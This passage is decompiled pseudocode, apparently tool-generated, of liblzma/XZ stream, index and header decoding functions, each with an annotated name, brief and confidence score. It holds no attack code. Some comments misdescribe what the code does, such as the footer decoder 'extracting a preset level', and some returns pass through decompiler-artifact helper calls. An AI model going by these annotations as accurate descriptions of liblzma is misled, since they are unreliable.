              return uVar5;
            }
          }
          else {
            lVar4 = uVar3 - lVar4;
            *(long *)(unaff_RBX + 0x54) = lVar4;
            *(long *)(unaff_RBX + 0x56) = lVar4;
          }
          lVar4 = lzma_bufcpy();
          uVar8 = *(ulong *)(unaff_RBX + 0x56);
          *(long *)(unaff_RBX + 2) = *(long *)(unaff_RBX + 2) + lVar4;
          if (*(ulong *)(unaff_RBX + 0x54) < uVar8) {
            return 0;
          }
          *(long *)(unaff_RBX + 4) = *(long *)(unaff_RBX + 4) - 0xc;
          *(ulong *)(unaff_RBX + 0x56) = uVar8 - 0xc;
          *(ulong *)(unaff_RBX + 0x54) = uVar8 - 0xc;
          uVar5 = lzma_stream_header_decode(unaff_RBX + 0x38,(long)unaff_RBX + uVar8 + 0x154);
          if ((int)uVar5 == 7) {
            return 9;
          }
          if ((int)uVar5 != 0) {
            return uVar5;
          }
          *unaff_RBX = 7;
        }
        uVar5 = lzma_stream_flags_compare(unaff_RBX + 0x38);
        if ((int)uVar5 != 0) {
          return uVar5;
        }
        iVar1 = lzma_index_stream_flags(*(undefined8 *)(unaff_RBX + 0x1e),unaff_RBX + 0x46);
        if ((iVar1 != 0) ||
           (iVar1 = lzma_index_stream_padding
                              (*(undefined8 *)(unaff_RBX + 0x1e),*(undefined8 *)(unaff_RBX + 0x20)),
           iVar1 != 0)) goto LAB_001102a2;
        uVar5 = *(undefined8 *)(unaff_RBX + 0x1e);
        *(undefined8 *)(unaff_RBX + 0x20) = 0;
        if (*(long *)(unaff_RBX + 0x22) != 0) {
          uVar5 = lzma_index_cat();
          if ((int)uVar5 != 0) {
            return uVar5;
          }
          uVar5 = *(undefined8 *)(unaff_RBX + 0x1e);
        }
        *(undefined8 *)(unaff_RBX + 0x22) = uVar5;
        *(undefined8 *)(unaff_RBX + 0x1e) = 0;
        if (*(long *)(unaff_RBX + 4) == 0) {
          **(undefined8 **)(unaff_RBX + 0x24) = uVar5;
          *(undefined8 *)(unaff_RBX + 0x22) = 0;
          *unaff_R12 = unaff_RBP;
          uVar5 = FUN_00110077();
          return uVar5;
        }
        if (*(long *)(unaff_RBX + 0x56) == 0) break;
        *unaff_RBX = 2;
      }
      goto switchD_0010fc39_caseD_1;
    }
  }
  return uVar5;
}



/**
 * @name  lzma_properties_decode
 * @brief Decodes LZMA filter properties by searching 12 filter types in jump table, dispatching to appropriate decoder.
 * @confidence 90%
 * @classification parser
 * @address 0x001106c0
 */

/* Decodes LZMA properties by iterating through 12 predefined property types, dispatching to
   appropriate decoder functions via jump table */

long lzma_properties_decode(long *param_1,undefined8 param_2,undefined8 param_3,long param_4)

{
  long lVar1;
  long *plVar2;
  long lVar3;
  
  param_1[1] = 0;
  lVar1 = 0;
  plVar2 = &decoder_filter_table;
  lVar3 = 0x4000000000000001;
  while( true ) {
    if (*param_1 == lVar3) {
      if ((code *)(&PTR_lzma_delta_decoder_init_00131c38)[lVar1 * 4] != (code *)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00110721. Too many branches */
                    /* WARNING: Treating indirect jump as call */
        lVar3 = (*(code *)(&PTR_lzma_delta_decoder_init_00131c38)[lVar1 * 4])(param_1 + 1);
        return lVar3;
      }
      return (ulong)(param_4 != 0) << 3;
    }
    lVar1 = lVar1 + 1;
    if (lVar1 == 0xc) break;
    lVar3 = *plVar2;
    plVar2 = plVar2 + 4;
  }
  return 8;
}



/**
 * @name  lzma_filter_flags_decode
 * @brief Decodes LZMA filter flags: reads filter ID VLI, properties size VLI, then decodes properties.
 * @confidence 90%
 * @classification parser
 * @address 0x00110740
 */

undefined8
lzma_filter_flags_decode(ulong *param_1,undefined8 param_2,long param_3,long *param_4,long param_5)

{
  undefined8 uVar1;
  long in_FS_OFFSET;
  ulong local_38;
  long local_30;
  
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  param_1[1] = 0;
  uVar1 = lzma_vli_decode(param_1,0);
  if ((int)uVar1 != 0) goto LAB_001107d0;
  if (*param_1 < 0x4000000000000000) {
    uVar1 = lzma_vli_decode(&local_38,0,param_3,param_4,param_5);
    if ((int)uVar1 != 0) goto LAB_001107d0;
    if (local_38 <= (ulong)(param_5 - *param_4)) {
      uVar1 = lzma_properties_decode(param_1,param_2,*param_4 + param_3);
      *param_4 = *param_4 + local_38;
      goto LAB_001107d0;
    }
  }
  uVar1 = 9;
LAB_001107d0:
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar1;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_index_decoder_run
 * @brief State machine for decoding LZMA index data. States: 0=indicator, 1=record count VLI, 2=memory check/init, 3/4=unpadded/uncompressed size VLIs, 5/6=padding, 7=CRC32 verification.
 * @confidence 90%
 * @classification parser
 * @address 0x00110890
 */

/* State machine for decoding LZMA index data. States: 0=indicator byte, 1=decode record count VLI,
   2=check memory/init, 3/4=decode unpadded size and uncompressed size VLIs, 5/6=padding, 7=CRC32
   verification. Returns liblzma error codes. */

ulong lzma_index_decoder_run
                (int *param_1,undefined8 param_2,long param_3,ulong *param_4,ulong param_5)

{
  char cVar1;
  int iVar2;
  uint uVar3;
  ulong uVar4;
  ulong uVar5;
  ulong uVar6;
  ulong uVar7;
  long lVar8;
  int *piVar9;
  
  uVar4 = *param_4;
  if (param_5 <= uVar4) {
LAB_00110a6d:
    uVar4 = get_base_pointer();
    return uVar4;
  }
  uVar5 = uVar4;
LAB_001108e0:
  switch(*param_1) {
  case 0:
    uVar7 = uVar5 + 1;
    cVar1 = *(char *)(param_3 + uVar5);
    *param_4 = uVar7;
    if (cVar1 != '\0') goto LAB_00110aa8;
    *param_1 = 1;
    break;
  case 1:
    uVar3 = lzma_vli_decode(param_1 + 8,param_1 + 0xe,param_3,param_4,param_5);
    if (uVar3 == 1) {
      param_1[0xe] = 0;
      param_1[0xf] = 0;
      *param_1 = 2;
      goto switchD_001108f4_caseD_2;
    }
LAB_00110b49:
    uVar6 = (ulong)uVar3;
    uVar5 = *param_4;
    goto LAB_00110b4c;
  case 2:
switchD_001108f4_caseD_2:
    uVar5 = lzma_index_memusage(1,*(undefined8 *)(param_1 + 8));
    if (uVar5 <= *(ulong *)(param_1 + 2)) {
      lzma_index_set_uncompressed_limit(*(undefined8 *)(param_1 + 4),*(undefined8 *)(param_1 + 8));
      lVar8 = *(long *)(param_1 + 8);
      goto LAB_00110959;
    }
    uVar5 = *param_4;
    uVar6 = 6;
LAB_00110b4c:
    lVar8 = uVar5 - uVar4;
    if (lVar8 == 0) {
      return uVar6;
    }
    goto LAB_00110975;
  case 3:
  case 4:
    piVar9 = param_1 + 10;
    if (*param_1 != 3) {
      piVar9 = param_1 + 0xc;
    }
    uVar3 = lzma_vli_decode(piVar9,param_1 + 0xe,param_3,param_4,param_5);
    if (uVar3 != 1) goto LAB_00110b49;
    param_1[0xe] = 0;
    param_1[0xf] = 0;
    if (*param_1 == 3) {
      if (*(long *)(param_1 + 10) - 5U < 0x7ffffffffffffff8) {
        *param_1 = 4;
        uVar7 = *param_4;
        break;
      }
      goto LAB_00110aa8;
    }
    uVar3 = lzma_index_append(*(undefined8 *)(param_1 + 4),param_2,*(long *)(param_1 + 10),
                              *(undefined8 *)(param_1 + 0xc));
    if (uVar3 != 0) {
      return (ulong)uVar3;
    }
    lVar8 = *(long *)(param_1 + 8) - 1;
    *(long *)(param_1 + 8) = lVar8;
LAB_00110959:
    uVar7 = *param_4;
    *param_1 = (-(uint)(lVar8 == 0) & 2) + 3;
    break;
  case 5:
    uVar3 = lzma_index_padding_size(*(undefined8 *)(param_1 + 4));
    *param_1 = 6;
    uVar6 = (ulong)uVar3;
    *(ulong *)(param_1 + 0xe) = uVar6;
    goto LAB_00110a7c;
  case 6:
    uVar6 = *(ulong *)(param_1 + 0xe);
LAB_00110a7c:
    uVar5 = *param_4;
    if (uVar6 == 0) {
      iVar2 = lzma_crc32(param_3 + uVar4,uVar5 - uVar4,param_1[0x10]);
      *param_1 = 7;
      param_1[0x10] = iVar2;
LAB_00110a68:
      while (uVar5 != param_5) {
        lVar8 = *(long *)(param_1 + 0xe);
        uVar3 = param_1[0x10];
        uVar5 = uVar5 + 1;
        *param_4 = uVar5;
        if (*(char *)(param_3 - 1 + uVar5) != (char)(uVar3 >> ((char)lVar8 * '\b' & 0x1fU))) {
LAB_00110aa8:
          uVar4 = get_base_pointer();
          return uVar4;
        }
        uVar4 = lVar8 + 1;
        *(ulong *)(param_1 + 0xe) = uVar4;
        if (3 < uVar4) {
          **(undefined8 **)(param_1 + 6) = *(undefined8 *)(param_1 + 4);
          param_1[4] = 0;
          param_1[5] = 0;
          uVar4 = get_base_pointer();
          return uVar4;
        }
      }
      goto LAB_00110a6d;
    }
    uVar7 = uVar5 + 1;
    cVar1 = *(char *)(param_3 + uVar5);
    *(ulong *)(param_1 + 0xe) = uVar6 - 1;
    *param_4 = uVar7;
    if (cVar1 != '\0') goto LAB_00110aa8;
    break;
  case 7:
    uVar5 = *param_4;
    goto LAB_00110a68;
  default:
    uVar4 = get_base_pointer();
    return uVar4;
  }
  uVar5 = uVar7;
  if (param_5 <= uVar7) {
    lVar8 = uVar7 - uVar4;
    uVar6 = 0;
LAB_00110975:
    iVar2 = lzma_crc32(uVar4 + param_3,lVar8,param_1[0x10]);
    param_1[0x10] = iVar2;
    return uVar6;
  }
  goto LAB_001108e0;
}



/**
 * @name  lzma_index_hash_decode_dispatch
 * @brief State machine dispatch for index hash decoding: processes input byte-by-byte with CRC32 computation.
 * @confidence 55%
 * @classification parser
 * @address 0x00110a08
 */

/* Processes input data byte-by-byte in a state machine with CRC32 checksum computation and state
   dispatch */

undefined8 switchD_001108f4::process_input_byte_switch(undefined8 param_1,long param_2)

{
  ulong uVar1;
  char cVar2;
  uint uVar3;
  undefined8 uVar4;
  uint *unaff_RBX;
  long unaff_R12;
  ulong unaff_R13;
  long unaff_R14;
  ulong *unaff_R15;
  long unaff_retaddr;
  
  uVar1 = param_2 + 1;
  cVar2 = *(char *)(unaff_R14 + param_2);
  *unaff_R15 = uVar1;
  if (cVar2 != '\0') {
    uVar4 = get_base_pointer();
    return uVar4;
  }
  *unaff_RBX = 1;
  if (unaff_R13 <= uVar1) {
    uVar3 = lzma_crc32(unaff_retaddr + unaff_R14,uVar1 - unaff_retaddr,unaff_RBX[0x10]);
    unaff_RBX[0x10] = uVar3;
    return 0;
  }
  if (*unaff_RBX < 8) {
                    /* WARNING: Could not recover jumptable at 0x001108f4. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    uVar4 = (*(code *)(*(int *)(unaff_R12 + (ulong)*unaff_RBX * 4) + unaff_R12))();
    return uVar4;
  }
  uVar4 = get_base_pointer();
  return uVar4;
}



/**
 * @name  lzma_index_hash_decode
 * @brief Incrementally decodes and validates an LZMA Index block with hash verification. Uses a 7-state machine for streaming/incremental parsing: (0) check index indicator byte is 0x00, (1) decode number of records VLI and compare to expected count, (2) decode unpadded size VLI per record, (3) decode uncompressed size VLI per record, (4) calculate padding alignment, (5) verify padding bytes are zero, (6) verify trailing CRC32. Returns LZMA_OK when more input needed, LZMA_STREAM_END on success, LZMA_DATA_ERROR on mismatch.
 * @confidence 95%
 * @classification parser
 * @address 0x001110e0
 */

/* Incrementally decodes and validates an LZMA Index block with hash verification. Uses a 7-state
   machine for streaming/incremental parsing: (0) check index indicator byte is 0x00, (1) decode
   number of records VLI and compare to expected count, (2) decode unpadded size VLI per record, (3)
   decode uncompressed size VLI per record, (4) calculate padding alignment, (5) verify padding
   bytes are zero, (6) verify CRC32. Returns LZMA_OK (0) when more input needed, LZMA_STREAM_END on
   success, LZMA_DATA_ERROR (9/10) on mismatch. */

ulong lzma_index_hash_decode(int *param_1,long param_2,ulong *param_3,ulong param_4)

{
  int iVar1;
  uint uVar2;
  ulong uVar3;
  ulong uVar4;
  ulong uVar5;
  long lVar6;
  int *piVar7;
  
  uVar3 = *param_3;
  if (param_4 <= uVar3) {
    return 10;
  }
  uVar4 = uVar3;
  do {
    switch(*param_1) {
    case 0:
      uVar5 = uVar4 + 1;
      *param_3 = uVar5;
      if (*(char *)(param_2 + uVar4) != '\0') goto LAB_00111328;
      *param_1 = 1;
      break;
    case 1:
      uVar2 = lzma_vli_decode(param_1 + 0x46,param_1 + 0x4c,param_2,param_3,param_4);
      if (uVar2 != 1) {
code_r0x001113af:
        lVar6 = *param_3 - uVar3;
        if (lVar6 == 0) {
          return (ulong)uVar2;
        }
        goto LAB_0011128d;
      }
      lVar6 = *(long *)(param_1 + 0x46);
      if (lVar6 != *(long *)(param_1 + 6)) goto LAB_00111328;
      param_1[0x4c] = 0;
      param_1[0x4d] = 0;
LAB_0011126c:
      uVar5 = *param_3;
      *param_1 = (-(uint)(lVar6 == 0) & 2) + 2;
      break;
    case 2:
    case 3:
      piVar7 = param_1 + 0x48;
      if (*param_1 != 2) {
        piVar7 = param_1 + 0x4a;
      }
      uVar2 = lzma_vli_decode(piVar7,param_1 + 0x4c,param_2,param_3,param_4);
      if (uVar2 != 1) goto code_r0x001113af;
      param_1[0x4c] = 0;
      param_1[0x4d] = 0;
      if (*param_1 != 2) {
        lzma_vli_update_block_size
                  (param_1 + 0x24,*(long *)(param_1 + 0x48),*(undefined8 *)(param_1 + 0x4a));
        if (((*(ulong *)(param_1 + 0x24) <= *(ulong *)(param_1 + 2)) &&
            (*(ulong *)(param_1 + 0x26) <= *(ulong *)(param_1 + 4))) &&
           (*(ulong *)(param_1 + 0x2a) <= *(ulong *)(param_1 + 8))) {
          lVar6 = *(long *)(param_1 + 0x46) - 1;
          *(long *)(param_1 + 0x46) = lVar6;
          goto LAB_0011126c;
        }
        goto LAB_00111328;
      }
      if (0x7ffffffffffffff7 < *(long *)(param_1 + 0x48) - 5U) goto LAB_00111328;
      *param_1 = 3;
      uVar5 = *param_3;
      break;
    case 4:
      iVar1 = lzma_vli_size(*(undefined8 *)(param_1 + 0x28));
      *param_1 = 5;
      uVar4 = (ulong)(-(iVar1 + 1 + (int)*(undefined8 *)(param_1 + 0x2a)) & 3);
      *(ulong *)(param_1 + 0x4c) = uVar4;
      goto LAB_001112f9;
    case 5:
      uVar4 = *(ulong *)(param_1 + 0x4c);
LAB_001112f9:
      if (uVar4 == 0) {
        if (((*(long *)(param_1 + 2) == *(long *)(param_1 + 0x24)) &&
            (*(long *)(param_1 + 4) == *(long *)(param_1 + 0x26))) &&
           (*(long *)(param_1 + 8) == *(long *)(param_1 + 0x2a))) {
          lzma_check_finish(param_1 + 10,10);
          lzma_check_finish(param_1 + 0x2c,10);
          uVar2 = lzma_check_size(10);
          iVar1 = memcmp(param_1 + 10,param_1 + 0x2c,(ulong)uVar2);
          if (iVar1 == 0) {
            uVar4 = *param_3;
            iVar1 = lzma_crc32(param_2 + uVar3,uVar4 - uVar3,param_1[0x4e]);
            *param_1 = 6;
            param_1[0x4e] = iVar1;
            while( true ) {
              if (uVar4 == param_4) {
                return 0;
              }
              iVar1 = param_1[0x4c];
              uVar2 = param_1[0x4e];
              *param_3 = uVar4 + 1;
              if (*(char *)(param_2 + uVar4) != (char)(uVar2 >> ((char)iVar1 * '\b' & 0x1fU)))
              break;
              lVar6 = *(long *)(param_1 + 0x4c);
              *(ulong *)(param_1 + 0x4c) = lVar6 + 1U;
              if (3 < lVar6 + 1U) {
                uVar3 = get_r11d_register();
                return uVar3;
              }
switchD_00111145_caseD_6:
              uVar4 = *param_3;
            }
          }
        }
LAB_00111328:
        uVar3 = get_r11d_register();
        return uVar3;
      }
      *(ulong *)(param_1 + 0x4c) = uVar4 - 1;
      uVar4 = *param_3;
      uVar5 = uVar4 + 1;
      *param_3 = uVar5;
      if (*(char *)(param_2 + uVar4) != '\0') goto LAB_00111328;
      break;
    case 6:
      goto switchD_00111145_caseD_6;
    default:
      uVar3 = get_r11d_register();
      return uVar3;
    }
    uVar4 = uVar5;
  } while (uVar5 < param_4);
  lVar6 = uVar5 - uVar3;
LAB_0011128d:
  iVar1 = lzma_crc32(param_2 + uVar3,lVar6,param_1[0x4e]);
  param_1[0x4e] = iVar1;
  uVar3 = get_r11d_register();
  return uVar3;
}



/**
 * @name  lzma_index_hash_decode_crc32
 * @brief Processes a block of data for CRC32 checksum computation during index hash decoding with state dispatch.
 * @confidence 55%
 * @classification parser
 * @address 0x001112b0
 */

/* Processes a block of data for CRC32 checksum computation with position tracking and state
   dispatch */

void switchD_00111145::crc32_block_processor(undefined8 param_1,long param_2)

{
  ulong uVar1;
  uint uVar2;
  uint *unaff_RBX;
  ulong *unaff_RBP;
  long unaff_R12;
  long unaff_R13;
  ulong unaff_R14;
  long unaff_R15;
  
  uVar1 = param_2 + 1;
  *unaff_RBP = uVar1;
  if (*(char *)(unaff_R13 + param_2) != '\0') {
    get_r11d_register();
    return;
  }
  *unaff_RBX = 1;
  if (unaff_R14 <= uVar1) {
    uVar2 = lzma_crc32(unaff_R13 + unaff_R15,uVar1 - unaff_R15,unaff_RBX[0x4e]);
    unaff_RBX[0x4e] = uVar2;
    get_r11d_register();
    return;
  }
  if (*unaff_RBX < 7) {
                    /* WARNING: Could not recover jumptable at 0x00111145. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    (*(code *)(*(int *)(unaff_R12 + (ulong)*unaff_RBX * 4) + unaff_R12))();
    return;
  }
  get_r11d_register();
  return;
}



/**
 * @name  lzma_stream_decoder_decode
 * @brief XZ stream decoder state machine. States: 0=stream header, 1=block header, 2=decode block header, 3=decode block, 4=index hash decode, 5=stream footer, 6=stream padding. Supports concatenated streams.
 * @confidence 90%
 * @classification parser
 * @address 0x001118c0
 */

/* State machine for decoding an LZMA stream. States: 0=stream header, 1=block header, 2=decode
   block header, 3=decode block data, 4=index hash decode, 5=stream footer, 6=stream padding.
   Validates stream flags, memory limits, supports concatenated streams. */

ulong lzma_stream_decoder_decode
                (undefined4 *param_1,undefined8 param_2,long param_3,ulong *param_4,ulong param_5,
                undefined8 param_6,undefined8 param_7,undefined8 param_8,int param_9)

{
  byte bVar1;
  char cVar2;
  uint uVar3;
  int iVar4;
  ulong uVar5;
  undefined8 uVar6;
  long lVar7;
  ulong uVar8;
  long in_FS_OFFSET;
  undefined1 local_d8 [8];
  long local_d0;
  undefined1 local_98 [88];
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  switch(*param_1) {
  case 0:
    break;
  case 1:
    goto switchD_00111922_caseD_1;
  case 2:
    goto LAB_00111c27;
  case 3:
    goto switchD_00111922_caseD_3;
  case 4:
    if (*param_4 < param_5) goto LAB_001119f9;
    uVar5 = stack_check_guard();
    return uVar5;
  case 5:
    goto switchD_00111922_caseD_5;
  case 6:
    goto switchD_00111922_caseD_6;
  default:
    uVar5 = stack_check_guard();
    return uVar5;
  }
switchD_00111922_caseD_0:
  lzma_bufcpy(param_3,param_4,param_5,param_1 + 0x62,param_1 + 0x60,0xc);
  if (0xb < *(ulong *)(param_1 + 0x60)) {
    *(undefined8 *)(param_1 + 0x60) = 0;
    uVar5 = lzma_stream_header_decode(param_1 + 0x4a,param_1 + 0x62);
    if ((int)uVar5 == 0) {
      *(undefined1 *)((long)param_1 + 0x17d) = 0;
      *param_1 = 1;
      param_1[0x18] = param_1[0x4e];
      if ((*(char *)(param_1 + 0x5e) != '\0') && (param_1[0x4e] == 0)) {
        uVar5 = stack_check_guard();
        return uVar5;
      }
      if ((*(char *)((long)param_1 + 0x179) != '\0') &&
         (cVar2 = lzma_check_is_supported(), cVar2 == '\0')) {
        uVar5 = stack_check_guard();
        return uVar5;
      }
      if (*(char *)((long)param_1 + 0x17a) == '\0') {
switchD_00111922_caseD_1:
        do {
          if (param_5 <= *param_4) goto LAB_00111cb6;
          if (*(long *)(param_1 + 0x60) == 0) {
            bVar1 = *(byte *)(param_3 + *param_4);
            if (bVar1 == 0) goto code_r0x001119f2;
            iVar4 = (uint)bVar1 * 4 + 4;
            param_1[0x17] = iVar4;
          }
          else {
            iVar4 = param_1[0x17];
          }
          lzma_bufcpy(param_3,param_4,param_5,param_1 + 0x62,param_1 + 0x60,iVar4);
          if (*(ulong *)(param_1 + 0x60) < (ulong)(uint)param_1[0x17]) goto LAB_00111cb6;
          *(undefined8 *)(param_1 + 0x60) = 0;
          *param_1 = 2;
LAB_00111c27:
          param_1[0x16] = 1;
          *(undefined1 **)(param_1 + 0x1e) = local_98;
          uVar5 = lzma_block_header_decode(param_1 + 0x16,param_2,param_1 + 0x62);
          if ((int)uVar5 != 0) goto code_r0x00111bf0;
          *(undefined1 *)(param_1 + 0x48) = *(undefined1 *)((long)param_1 + 0x17b);
          uVar5 = lzma_raw_decoder_memusage(local_98);
          if (uVar5 == 0xffffffffffffffff) {
            lzma_filters_free(local_98,param_2);
            *(undefined8 *)(param_1 + 0x1e) = 0;
            uVar5 = stack_check_guard();
            return uVar5;
          }
          *(ulong *)(param_1 + 0x5c) = uVar5;
          if (*(ulong *)(param_1 + 0x5a) < uVar5) {
            lzma_filters_free(local_98,param_2);
            *(undefined8 *)(param_1 + 0x1e) = 0;
            uVar5 = stack_check_guard();
            return uVar5;
          }
          uVar3 = lzma_block_decoder_init(param_1 + 2,param_2,param_1 + 0x16);
          lzma_filters_free(local_98,param_2);
          uVar5 = (ulong)uVar3;
          *(undefined8 *)(param_1 + 0x1e) = 0;
          if (uVar3 != 0) goto code_r0x00111bf0;
          *param_1 = 3;
switchD_00111922_caseD_3:
          uVar5 = (**(code **)(param_1 + 8))
                            (*(undefined8 *)(param_1 + 2),param_2,param_3,param_4,param_5,param_6,
                             param_7,param_8,param_9);
          if ((int)uVar5 != 1) goto code_r0x00111bf0;
          uVar6 = lzma_block_unpadded_size(param_1 + 0x16);
          uVar5 = lzma_index_hash_append
                            (*(undefined8 *)(param_1 + 0x58),uVar6,*(undefined8 *)(param_1 + 0x1c));
          if ((int)uVar5 != 0) goto code_r0x00111bf0;
          *param_1 = 1;
        } while( true );
      }
      uVar5 = 4;
    }
    else if ((int)uVar5 == 7) {
      uVar5 = stack_check_guard();
      return uVar5;
    }
    goto code_r0x00111bf0;
  }
LAB_00111cb6:
  uVar5 = stack_check_guard();
  return uVar5;
code_r0x001119f2:
  *param_1 = 4;
LAB_001119f9:
  uVar5 = lzma_index_hash_decode(*(undefined8 *)(param_1 + 0x58),param_3,param_4,param_5);
  if ((int)uVar5 == 1) {
    *param_1 = 5;
switchD_00111922_caseD_5:
    lzma_bufcpy(param_3,param_4,param_5,param_1 + 0x62,param_1 + 0x60,0xc);
    if (*(ulong *)(param_1 + 0x60) < 0xc) goto LAB_00111cb6;
    *(undefined8 *)(param_1 + 0x60) = 0;
    iVar4 = lzma_stream_footer_decode(local_d8,param_1 + 0x62);
    if (iVar4 != 0) {
      uVar5 = stack_check_guard();
      return uVar5;
    }
    lVar7 = lzma_index_hash_size(*(undefined8 *)(param_1 + 0x58));
    if (lVar7 == local_d0) {
      uVar5 = lzma_stream_flags_compare(param_1 + 0x4a,local_d8);
      if ((int)uVar5 != 0) goto code_r0x00111bf0;
      if (*(char *)(param_1 + 0x5f) == '\0') {
        uVar5 = stack_check_guard();
        return uVar5;
      }
      *param_1 = 6;
switchD_00111922_caseD_6:
      uVar5 = *param_4;
      if (param_5 <= uVar5) {
LAB_00111ca8:
        if (param_9 == 3) {
          uVar5 = stack_check_guard();
          return uVar5;
        }
        goto LAB_00111cb6;
      }
      uVar8 = *(ulong *)(param_1 + 0x60);
      while (*(char *)(param_3 + uVar5) == '\0') {
        uVar5 = uVar5 + 1;
        uVar8 = (ulong)((int)uVar8 + 1U & 3);
        *param_4 = uVar5;
        *(ulong *)(param_1 + 0x60) = uVar8;
        if (uVar5 == param_5) goto LAB_00111ca8;
      }
      if (uVar8 == 0) {
        lVar7 = lzma_index_hash_init(*(undefined8 *)(param_1 + 0x58),param_2);
        *(long *)(param_1 + 0x58) = lVar7;
        if (lVar7 == 0) {
          uVar5 = stack_check_guard();
          return uVar5;
        }
        *param_1 = 0;
        *(undefined8 *)(param_1 + 0x60) = 0;
        goto switchD_00111922_caseD_0;
      }
      *param_4 = uVar5 + 1;
    }
    uVar5 = stack_check_guard();
    return uVar5;
  }
code_r0x00111bf0:
  if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar5;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_stream_header_decode
 * @brief Decodes LZMA stream header: validates 6-byte magic, checks CRC32, extracts check type from flags byte.
 * @confidence 92%
 * @classification parser
 * @address 0x00111e70
 */

/* Decodes LZMA stream header. Validates magic number (6 bytes), CRC-32 checksum, reserved fields,
   extracts filter count. Returns error codes for validation failures. */

undefined8 lzma_stream_header_decode(undefined4 *param_1,int *param_2)

{
  byte bVar1;
  int iVar2;
  undefined8 uVar3;
  
  if (*param_2 != xz_stream_header_magic) {
    return 7;
  }
  if ((short)param_2[1] == xz_stream_header_flags_magic) {
    iVar2 = lzma_crc32((long)param_2 + 6,2,0);
    uVar3 = 9;
    if (((iVar2 == param_2[2]) && (uVar3 = 8, *(char *)((long)param_2 + 6) == '\0')) &&
       ((*(byte *)((long)param_2 + 7) & 0xf0) == 0)) {
      *param_1 = 0;
      bVar1 = *(byte *)((long)param_2 + 7);
      *(undefined8 *)(param_1 + 2) = 0xffffffffffffffff;
      param_1[4] = bVar1 & 0xf;
      return 0;
    }
  }
  else {
    uVar3 = 7;
  }
  return uVar3;
}



/**
 * @name  lzma_stream_footer_decode
 * @brief Decodes LZMA stream footer: validates magic bytes, CRC32, reserved fields, extracts check type and backward size.
 * @confidence 92%
 * @classification parser
 * @address 0x00111f10
 */

/* Decodes LZMA stream footer. Validates magic number, CRC32, reserved fields. Extracts preset level
   and uncompressed size (packed as VLI). */

undefined8 lzma_stream_footer_decode(undefined4 *param_1,int *param_2)

{
  int iVar1;
  undefined8 uVar2;
  
  if (xz_stream_footer_magic == *(short *)((long)param_2 + 10)) {
    iVar1 = lzma_crc32(param_2 + 1,6,0);
    uVar2 = 9;
    if (((iVar1 == *param_2) && (uVar2 = 8, (char)param_2[2] == '\0')) &&
       ((*(byte *)((long)param_2 + 9) & 0xf0) == 0)) {
      *param_1 = 0;
      param_1[4] = *(byte *)((long)param_2 + 9) & 0xf;
      *(ulong *)(param_1 + 2) = (ulong)(uint)param_2[1] * 4 + 4;
      uVar2 = 0;
    }
    return uVar2;
  }
  return 7;
}



/**
 * @name  lzma_vli_decode
 * @brief Decodes variable-length integer from input buffer. Each byte has 7 data bits, bit 7 is continuation. Supports incremental decoding.
 * @confidence 95%
 * @classification parser
 * @address 0x00111fa0
 */

/* Decodes a variable-length integer (VLI) from input buffer. Each byte contributes 7 bits; high bit
   indicates continuation. Supports incremental decoding via vli_pos. Returns: 0=need more input,
   1=complete, 9=data error, 0xb=prog error, 10=buf error. */

undefined1 lzma_vli_decode(ulong *param_1,ulong *param_2,long param_3,ulong *param_4,ulong param_5)

{
  byte bVar1;
  ulong uVar2;
  int iVar3;
  ulong uVar4;
  ulong *puVar5;
  ulong uVar6;
  long in_FS_OFFSET;
  undefined1 uVar7;
  ulong local_28;
  long local_20;
  
  puVar5 = &local_28;
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  local_28 = 0;
  if (param_2 == (ulong *)0x0) {
    uVar2 = *param_4;
    *param_1 = 0;
    if (uVar2 < param_5) {
      uVar4 = 0;
      uVar6 = 0;
      goto LAB_00111ff3;
    }
  }
  else {
    uVar6 = *param_2;
    if (uVar6 == 0) {
      *param_1 = 0;
    }
    else {
      uVar7 = 0xb;
      if ((8 < uVar6) || (*param_1 >> ((char)uVar6 * '\a' & 0x3fU) != 0)) goto LAB_00112060;
    }
    uVar2 = *param_4;
    uVar7 = 10;
    if (param_5 <= uVar2) goto LAB_00112060;
    uVar4 = *param_1;
    puVar5 = param_2;
LAB_00111ff3:
    iVar3 = (int)uVar6 * 7;
    do {
      bVar1 = *(byte *)(param_3 + uVar2);
      uVar6 = uVar6 + 1;
      uVar2 = uVar2 + 1;
      uVar4 = uVar4 + ((ulong)(bVar1 & 0x7f) << ((byte)iVar3 & 0x3f));
      if (-1 < (char)bVar1) {
        *param_4 = uVar2;
        *param_1 = uVar4;
        *puVar5 = uVar6;
        if ((1 < uVar6) && (bVar1 == 0)) goto LAB_00112109;
        uVar7 = puVar5 != &local_28;
        goto LAB_00112060;
      }
      if (uVar6 == 9) {
        *param_4 = uVar2;
        uVar7 = 9;
        *param_1 = uVar4;
        *puVar5 = 9;
        goto LAB_00112060;
      }
      iVar3 = iVar3 + 7;
    } while (uVar2 < param_5);
    *param_4 = uVar2;
    uVar7 = 0;
    *param_1 = uVar4;
    *puVar5 = uVar6;
    if (puVar5 != &local_28) goto LAB_00112060;
  }
LAB_00112109:
  uVar7 = 9;
LAB_00112060:
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar7;
}



/**
 * @name  lzma_stream_decoder_mt_decode
 * @brief Main decode function for multi-threaded XZ stream decoder. Implements a 12-state machine parsing .xz stream structure: stream header (0) → block header parsing (1) → memory check (2) → worker thread dispatch (3) → threaded block decode (4) → single-thread fallback memory wait (5) → single-thread block decode (6) → wait for workers before index (7) → index hash decode (8) → stream footer (9) → stream padding (10) → error state (11). Manages pthreads worker pool, output queue, and memory limits. Falls back to single-threaded decoding when memory constraints prevent parallel operation.
 * @confidence 92%
 * @classification parser
 * @address 0x00112af0
 */

/* Main decode function for the multi-threaded LZMA/XZ stream decoder. Implements a state machine
   (states 0-11) that parses .xz stream structure: stream header → block headers → block data
   (threaded or single-threaded fallback) → index → stream footer → stream padding. Manages
   worker threads via pthreads, output queues, and memory limits. Falls back to single-threaded
